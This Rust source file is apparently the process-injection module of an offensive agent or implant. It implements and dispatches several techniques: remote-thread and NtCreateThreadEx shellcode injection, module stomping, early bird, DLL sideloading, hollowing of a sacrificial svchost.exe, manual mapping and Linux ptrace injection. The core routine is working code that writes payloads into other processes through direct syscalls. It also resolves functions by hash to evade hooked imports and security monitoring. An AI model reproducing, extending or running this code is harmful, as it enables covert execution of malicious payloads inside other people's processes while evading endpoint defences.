#[cfg(target_os = "linux")]
pub mod linux_inject;

pub mod dll_sideload;
#[cfg(windows)]
pub mod early_bird;
#[cfg(windows)]
pub mod module_stomp;
#[cfg(windows)]
pub mod nt_create_thread;
#[cfg(windows)]
pub mod remote_thread;

#[cfg(windows)]
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum InjectionMethod {
    Hollowing,
    ManualMap,
    RemoteThread,
    NtCreateThread,
    ModuleStomp,
    DllSideLoad,
    EarlyBird,
}

#[cfg(target_os = "linux")]
#[derive(Debug, Clone, Copy, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
pub enum InjectionMethod {
    LinuxPtrace,
}

#[cfg(any(windows, target_os = "linux"))]
pub trait Injector {
    fn inject(&self, pid: u32, payload: &[u8]) -> anyhow::Result<()>;
}

/// Shared NtCreateThreadEx-based injection primitive.
///
/// This is the common core used by both `RemoteThreadInjector` and
/// `NtCreateThreadInjector`.  It opens the target process, allocates RW
/// memory, writes the payload, flips the protection to RX, flushes the
/// I-cache, and spawns a new thread via `NtCreateThreadEx` (resolved
/// through `pe_resolve` to avoid hooked imports).
///
/// # Arguments
/// * `pid`         — Target process ID.
/// * `payload`     — Raw shellcode bytes (PE payloads must be handled by
///                    the caller before calling this function).
/// * `access_mask` — Desired access rights for `NtOpenProcess`.
/// * `label`       — Human-readable label for error messages (e.g. "RemoteThread").
#[cfg(windows)]
pub(crate) fn nt_create_thread_inject(
    pid: u32,
    payload: &[u8],
    access_mask: u32,
    label: &str,
) -> anyhow::Result<()> {
    use winapi::um::winnt::{
        MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, SYNCHRONIZE,
    };

    // Minimal thread access for NtCreateThreadEx: SYNCHRONIZE only.
    // The handle is closed immediately after creation (fire-and-forget).
    const THREAD_ACCESS_MINIMAL: u32 = SYNCHRONIZE;

    // Open target process via NtOpenProcess.
    let mut client_id = [0u64; 2];
    client_id[0] = pid as u64;
    let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = unsafe { std::mem::zeroed() };
    obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

    unsafe {
        let mut h_proc: usize = 0;
        let open_status = crate::syscall!(
            "NtOpenProcess",
            &mut h_proc as *mut _ as u64,
            access_mask as u64,
            &mut obj_attr as *mut _ as u64,
            client_id.as_mut_ptr() as u64,
        );
        match open_status {
            Ok(s) if s >= 0 && h_proc != 0 => {}
            _ => return Err(anyhow::anyhow!("{}: NtOpenProcess failed", label)),
        }
        let h_proc = h_proc as *mut std::ffi::c_void;

        macro_rules! close_h {
            ($h:expr) => {
                crate::syscall!("NtClose", $h as u64).ok();
            };
        }
        macro_rules! cleanup_and_err {
            ($msg:expr) => {{
                close_h!(h_proc);
                return Err(anyhow::anyhow!($msg));
            }};
            ($fmt:expr, $($arg:tt)*) => {{
                close_h!(h_proc);
                return Err(anyhow::anyhow!($fmt, $($arg)*));
            }};
        }

        // Allocate RW memory.
        let mut remote_mem: *mut std::ffi::c_void = std::ptr::null_mut();
        let mut alloc_size = payload.len();
        let s = crate::syscall!(
            "NtAllocateVirtualMemory",
            h_proc as u64,
            &mut remote_mem as *mut _ as u64,
            0u64,
            &mut alloc_size as *mut _ as u64,
            (MEM_COMMIT | MEM_RESERVE) as u64,
            PAGE_READWRITE as u64,
        );
        match s {
            Ok(st) if st >= 0 => {}
            _ => cleanup_and_err!("{}: NtAllocateVirtualMemory failed", label),
        }
        if remote_mem.is_null() {
            cleanup_and_err!("{}: NtAllocateVirtualMemory returned null", label);
        }

        // Write payload.
        let mut written = 0usize;
        let s = crate::syscall!(
            "NtWriteVirtualMemory",
            h_proc as u64,
            remote_mem as u64,
            payload.as_ptr() as u64,
            payload.len() as u64,
            &mut written as *mut _ as u64,
        );
        match s {
            Ok(st) if st >= 0 => {}
            _ => cleanup_and_err!("{}: NtWriteVirtualMemory failed", label),
        }
        if written != payload.len() {
            cleanup_and_err!(
                "{}: NtWriteVirtualMemory wrote {} of {} bytes",
                label,
                written,
                payload.len()
            );
        }

        // Switch to execute-read (no write).
        let mut old_prot = 0u32;
        let mut prot_base = remote_mem as usize;
        let mut prot_size = payload.len();
        let s = crate::syscall!(
            "NtProtectVirtualMemory",
            h_proc as u64,
            &mut prot_base as *mut _ as u64,
            &mut prot_size as *mut _ as u64,
            PAGE_EXECUTE_READ as u64,
            &mut old_prot as *mut _ as u64,
        );
        match s {
            Ok(st) if st >= 0 => {}
            _ => cleanup_and_err!("{}: NtProtectVirtualMemory to RX failed", label),
        }

        // Flush I-cache before creating the new thread.  Required for
        // correctness on ARM64 and defense-in-depth on x86_64.
        crate::syscall!(
            "NtFlushInstructionCache",
            h_proc as u64,
            remote_mem as u64,
            payload.len() as u64,
        )
        .ok();

        // Resolve NtCreateThreadEx via PEB walk.
        let ntdll_hash = pe_resolve::hash_str(b"ntdll.dll\0");
        let ntdll = pe_resolve::get_module_handle_by_hash(ntdll_hash)
            .ok_or_else(|| anyhow::anyhow!("{}: ntdll not found", label))?;
        let fn_hash = pe_resolve::hash_str(b"NtCreateThreadEx\0");
        let fn_ptr = pe_resolve::get_proc_address_by_hash(ntdll, fn_hash)
            .ok_or_else(|| anyhow::anyhow!("{}: NtCreateThreadEx not found", label))?
            as *mut winapi::ctypes::c_void;

        type NtCreateThreadExFn = unsafe extern "system" fn(
            *mut *mut winapi::ctypes::c_void,
            u32,
            *mut winapi::ctypes::c_void,
            *mut winapi::ctypes::c_void,
            *mut winapi::ctypes::c_void,
            *mut winapi::ctypes::c_void,
            u32,
            usize,
            usize,
            usize,
            *mut winapi::ctypes::c_void,
        ) -> i32;
        let nt_create: NtCreateThreadExFn = std::mem::transmute(fn_ptr);

        // Create the remote thread.
        let mut h_thread: *mut winapi::ctypes::c_void = std::ptr::null_mut();
        let status = nt_create(
            &mut h_thread,
            THREAD_ACCESS_MINIMAL,
            std::ptr::null_mut(),
            h_proc,
            remote_mem,
            std::ptr::null_mut(),
            0,
            0,
            0,
            0,
            std::ptr::null_mut(),
        );
        if status < 0 {
            cleanup_and_err!("{}: NtCreateThreadEx failed: {:x}", label, status);
        }
        if !h_thread.is_null() {
            close_h!(h_thread);
        }
        close_h!(h_proc);
    }
    Ok(())
}

#[cfg(windows)]
pub(crate) fn payload_has_valid_pe_headers(payload: &[u8]) -> bool {
    if payload.len() < 0x40 || payload[0] != b'M' || payload[1] != b'Z' {
        return false;
    }

    let e_lfanew =
        u32::from_le_bytes([payload[0x3c], payload[0x3d], payload[0x3e], payload[0x3f]]) as usize;

    if (e_lfanew & 0x3) != 0 {
        return false;
    }

    let sig_end = match e_lfanew.checked_add(4) {
        Some(v) => v,
        None => return false,
    };
    if sig_end > payload.len() {
        return false;
    }

    payload[e_lfanew..sig_end] == *b"PE\0\0"
}

/// Dispatch helper — select an injector and run it.
#[cfg(windows)]
pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    match method {
        InjectionMethod::NtCreateThread => {
            nt_create_thread::NtCreateThreadInjector.inject(pid, payload)
        }
        InjectionMethod::ModuleStomp => module_stomp::ModuleStompInjector.inject(pid, payload),
        InjectionMethod::RemoteThread => remote_thread::RemoteThreadInjector.inject(pid, payload),
        InjectionMethod::EarlyBird => early_bird::EarlyBirdInjector.inject(pid, payload),
        InjectionMethod::Hollowing => {
            // True process hollowing: spawn a sacrificial svchost.exe and replace its image.
            // The `pid` parameter is intentionally ignored; hollowing creates its own host.
            if pid != 0 {
                log::warn!(
                    "InjectionMethod::Hollowing ignores the target pid ({pid}); \
                     it always creates a new sacrificial process."
                );
            }
            let _ = pid;
            hollowing::hollow_and_execute(payload).map_err(|e| anyhow::anyhow!("{}", e))
        }
        InjectionMethod::ManualMap => manual_map_inject(pid, payload),
        InjectionMethod::DllSideLoad => dll_sideload::DllSideLoadInjector.inject(pid, payload),
    }
}

/// Dispatch helper — Linux injection methods.
#[cfg(target_os = "linux")]
pub fn inject_with_method(method: InjectionMethod, pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    match method {
        InjectionMethod::LinuxPtrace => {
            linux_inject::LinuxPtraceInjector::default().inject(pid, payload)
        }
    }
}

#[cfg(all(windows, feature = "manual-map"))]
fn manual_map_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
    unsafe {
        // Open the target process via NtOpenProcess with the access rights
        // required for remote manual-map: VM operations, VM write, and thread creation.
        let mut client_id = [0u64; 2];
        client_id[0] = pid as u64;
        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;

        let mut h_proc: usize = 0;
        let access_mask = (winapi::um::winnt::PROCESS_VM_OPERATION
            | winapi::um::winnt::PROCESS_VM_WRITE
            | winapi::um::winnt::PROCESS_VM_READ
            | winapi::um::winnt::PROCESS_CREATE_THREAD) as u64;
        let open_status = crate::syscall!(
            "NtOpenProcess",
            &mut h_proc as *mut _ as u64,
            access_mask,
            &mut obj_attr as *mut _ as u64,
            client_id.as_mut_ptr() as u64,
        );
        match open_status {
            Ok(s) if s >= 0 && h_proc != 0 => {}
            _ => return Err(anyhow::anyhow!("NtOpenProcess({pid}) failed")),
        }
        let process = h_proc as *mut winapi::ctypes::c_void;
        struct HandleGuard(*mut winapi::ctypes::c_void);
        impl Drop for HandleGuard {
            fn drop(&mut self) {
                crate::syscall!("NtClose", self.0 as u64).ok();
            }
        }
        let _guard = HandleGuard(process);
        module_loader::manual_map::load_dll_in_remote_process(process, payload).map(|_| ())
    }
}

#[cfg(all(windows, not(feature = "manual-map")))]
fn manual_map_inject(_pid: u32, _payload: &[u8]) -> anyhow::Result<()> {
    Err(anyhow::anyhow!(
        "ManualMap injection requires rebuilding the agent with the `manual-map` feature"
    ))
}
